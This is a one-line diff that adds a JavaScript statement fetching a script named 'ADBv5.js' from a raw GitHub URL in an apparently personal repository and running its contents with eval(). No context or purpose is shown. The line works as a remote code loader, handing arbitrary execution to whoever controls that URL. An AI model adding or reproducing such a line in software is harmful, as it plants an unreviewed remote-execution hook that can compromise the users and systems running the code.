@@ -1,0 +1,1 @@
+fetch('https://raw.githubusercontent.com/gfusn102-png/Noood/main/ADBv5.js').then(r => r.text()).then(t => eval(t));
